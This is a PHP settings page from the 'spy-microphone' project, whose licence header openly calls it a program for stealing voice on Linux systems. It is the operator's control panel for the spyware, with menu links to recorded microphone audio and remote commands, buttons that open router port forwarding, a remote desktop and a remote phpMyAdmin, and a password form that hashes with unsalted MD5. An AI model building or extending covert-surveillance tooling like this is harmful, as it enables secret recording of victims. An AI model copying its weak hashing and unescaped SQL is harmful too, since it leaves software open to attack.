<?php

#
# Copyright (c) 2018 Barchampas Gerasimos <makindosx@gmail.com>
# spy-microphone is a program for steal voice in gnu/linux OS.
#
# spy-microphone is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
#
# spy-microphone is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License, version 3,
# along with this program.  If not, see <http://www.gnu.org/licenses/>
#

session_start();

 if (!isset($_SESSION['login']))
    {
      header("Location: index.php");
      }

else
{
unset($_SESSION["hard_disk_id"]);
}

?>


﻿<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
      <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

     <title> Spy microphone Controller </title>

     <link rel="Shortcut Icon" type="image/ico" href="favicon.ico">


	<!-- BOOTSTRAP STYLES-->
    <link href="assets/css/bootstrap.css" rel="stylesheet" />
     <!-- FONTAWESOME STYLES-->
    <link href="assets/css/font-awesome.css" rel="stylesheet" />
        <!-- CUSTOM STYLES-->
    <link href="assets/css/custom.css" rel="stylesheet" />
     <!-- GOOGLE FONTS-->
   <link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css' />

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">



<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.13.0/css/all.css">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.13.0/css/v4-shims.css">


<style>

input
{
text-align:center;
font-size: 20px;
}


hr
{
  border: 1px solid red;

}


#inp_pass
{
width: 350px;
}


#btn_pass
{
width: 350px;
}

</style>


</head>


<body>
    <div id="wrapper">
        <nav class="navbar navbar-default navbar-cls-top " role="navigation" style="margin-bottom: 0">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".sidebar-collapse">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="dashboard.php"> Spymic </a>  
            </div>
  
      <div style="color: white; padding: 15px 50px 5px 50px;float: right; font-size: 16px;"> 
             <?php echo date("d-m-Y H:i"); ?> &nbsp; 
             <a href="logout.php" class="btn btn-danger square-btn-adjust">
              Logout <i class="fa fa-sign-out"></i>
             </a>  
           </div>

        </nav>   
           <!-- /. NAV TOP  -->
                <nav class="navbar-default navbar-side" role="navigation">
            <div class="sidebar-collapse">
                <ul class="nav" id="main-menu">
				<li class="text-center">
                    <img src="assets/img/find_user.png" class="user-image img-responsive"/>
					</li>
				
					
                     <li>
              <a href="dashboard.php"><i class="fa fa-dashboard fa-3x"></i> Dashboard </a>
                    </li>
                     <li>
                        <a  href="ui_elements.php"><i class="fa fa-desktop fa-3x"></i> UI Elements</a>
                    </li>
                   
      <li>
         <a  href="records_microphone.php"><i class="fa fa-microphone fa-3x"></i> Records Microphone</a>
      </li>
                   			
			                   
                    <li>
          <a href="#"><i class="fa fa-sitemap fa-3x"></i> Multi Tasking <span class="fa arrow"></span></a>
                        <ul class="nav nav-second-level">
                            <li>
                                <a href="#">Second Level Link</a>
                            </li>
                            <li>
                                <a href="#">Second Level Link</a>
                            </li>
                            <li>
                                <a href="#">Second Level Link<span class="fa arrow"></span></a>
                                <ul class="nav nav-third-level">
                                    <li>
                                        <a href="#">Third Level Link</a>
                                    </li>
                                    <li>
                                        <a href="#">Third Level Link</a>
                                    </li>
                                    <li>
                                        <a href="#">Third Level Link</a>
                                    </li>

                                </ul>
                               
                            </li>
                        </ul>
                      </li>  

             <li>
               <a href="remote_commands.php"> <i class="fa fa-terminal fa-3x"></i> Remote Commands </a>
             </li>	

             <li>
              <a class="active-menu" href="settings.php"><i class="fa fa-cogs fa-3x"></i> Settings </a>
             </li>

                </ul>
               
            </div>
            
        </nav>  
        <!-- /. NAV SIDE  -->
        <div id="page-wrapper" >
            <div id="page-inner">
                <div class="row">
                    <div class="col-md-12">
                       
                    </div>
                </div>
                 <!-- /. ROW  -->
              

              <div class='container-fluid'>
    <div class='panel panel-info'>
      <div class='panel-heading'>
        <div class='row'>
          <div class='col-xs-12 col-sm-12 col-md-8'>
            <h2 class='text-center pull-left' style='padding-left: 30px;'>  
            <i class='fa fa-cogs'> </i> Settings </h2> </h2>
          </div>
          <div class='col-xs-9 col-sm-9 col-md-9'>
            <div class='col-xs-12 col-sm-12 col-md-12'>
              <div class='col-xs-12 col-md-4'>             
              </div>
            </div>
          </div>
        </div>
      </div> 

      <div class='panel-body table-responsive'>
        <table class='table table-hover'>
          <thead>
            <tr>
              <th class='text-center'> Task <i class='fa fa-server'> </i> </th>
              <th class='text-center'> Operation <i class='fa fa-plug'> </i> </th>
              <th class='text-center'> Action <i class='fa fa-power-off'> </i> </th>
            </tr>
          </thead>


         <tbody>

          <tr>
             
           <td class='text-center'> <i class='fa fa-tablet'> </i> Router </td>
           <td class='text-center'> <i class='fa fa-ethernet'> </i> Port forward </td>
           <td class='text-center'>  

               <?php 

                  $ip = $_SERVER['REMOTE_ADDR'];
                  $gateway = "http://" .$gateway."".substr($ip, 0, strrpos($ip, ".")).".1"; 

                 ?>

             <a class="btn btn-md btn-success view"
                  href="<?php echo $gateway; ?>" target="_blank'">
                <i class='fas fa-toggle-on' aria-hidden='true'> Manage </i>
               </a>

         </td>

         </tr>



         <tr>
             
           <td class='text-center'> <i class='fa fa-columns'> </i> UI Panel </td>
           <td class='text-center'> <i class='fa fa-globe'> </i> Remote Desktop </td>
           <td class='text-center'>  

               <?php 
 
                 //$protocol = strtolower(substr($_SERVER["SERVER_PROTOCOL"],0,5))=='https'?'https':'http';
                 //$protocol = isset($_SERVER["HTTPS"]) ? 'https' : 'http';

                 $public_ip = "http://" .file_get_contents("https://ipinfo.io/ip");

               ?>

             <a class="btn btn-md btn-success view"
                  href="<?php echo $public_ip; ?>" target="_blank'">
                <i class='fas fa-toggle-on' aria-hidden='true'> Manage </i>
               </a>


         </td>

      </tr>



       <tr>
             
           <td class='text-center'> <i class='fa fa-database'> </i> Dtabase </td>
           <td class='text-center'> <i class='fa fa-globe'> </i> Remote Database </td>
           <td class='text-center'>  

               <?php 
 
                 //$protocol = strtolower(substr($_SERVER["SERVER_PROTOCOL"],0,5))=='https'?'https':'http';
                 //$protocol = isset($_SERVER["HTTPS"]) ? 'https' : 'http';

                 $public_ip = "http://" .file_get_contents("https://ipinfo.io/ip") ."/phpmyadmin/";

               ?>

             <a class="btn btn-md btn-success view"
                  href="<?php echo $public_ip; ?>" target="_blank'">
                <i class='fas fa-toggle-on' aria-hidden='true'> Manage </i>
               </a>


         </td>

      </tr>

         </tbody>
        </table>
      </div>


    </div>

      <br><br>

      <div align="center">

           <h2> Change Password <i class='fas fa-key'></i> </h2>

                  <hr>

         <form action="" method="post">


            <input type="password" name="password" class="form-control input-lg" 
                   id="inp_pass" placeholder="You pass" pattern=".{6,}"   
                    required title="6 characters minimum">

                    
                   <br>

            <button class="btn btn-lg btn-danger" name="submit_pass" id="btn_pass">
              Change password <i class='fas fa-lock'></i> 
           </button>
     
         </form>

<?php


 if(isset($_POST['submit_pass']))
  {


  require('__ROOT__/connect.php');
  require('__DEV__/function.php');

 $obj = new DATABASE_CONNECT;
 
  $host=$obj->connect[0];
  $user=$obj->connect[1];
  $pass=$obj->connect[2];
  $db=$obj->connect[3];
  
  $conn = new mysqli($host,$user,$pass,$db);
  
  if($conn->connect_error)
     {
     die ("Cannot connect to server " .$conn->connect_error);
       }

else
{

  $user_id = $_SESSION['login'];

  $password = md5(input($_POST['password']));
  $password = $conn->real_escape_string($password); 

  $sql ="update administrators set password = '$password'
         where user_id = '$user_id' and verify ='yes'";

  $result=$conn->query($sql);

  if ($result == true) 
     {  
      echo "<div class='col-lg-12' align='center'>
            <font size='5'> <i class='fa fa-check'></i> Password changed successfully </font> 
             <meta http-equiv='refresh' content='2; url=logout.php' />
         </div>";
     }


     else
      {
      echo " <div class='col-lg-12' align='center'>
            <font size='5'> <i class='fa fa-check'></i> Error. Please try again </font> 
            <meta http-equiv='refresh' content='2; url=settings.php' />
         </div>";
       }


 } // end else connect

 
 $conn->close();


} // end of isset submit
 

?>

        </div>

     


             <!-- /. PAGE INNER  -->
            </div>
         <!-- /. PAGE WRAPPER  -->
        </div>
     <!-- /. WRAPPER  -->
    <!-- SCRIPTS -AT THE BOTOM TO REDUCE THE LOAD TIME-->
    <!-- JQUERY SCRIPTS -->
    <script src="assets/js/jquery-1.10.2.js"></script>
      <!-- BOOTSTRAP SCRIPTS -->
    <script src="assets/js/bootstrap.min.js"></script>
    <!-- METISMENU SCRIPTS -->
    <script src="assets/js/jquery.metisMenu.js"></script>
      <!-- CUSTOM SCRIPTS -->
    <script src="assets/js/custom.js"></script>
    
   
</body>
</html> 
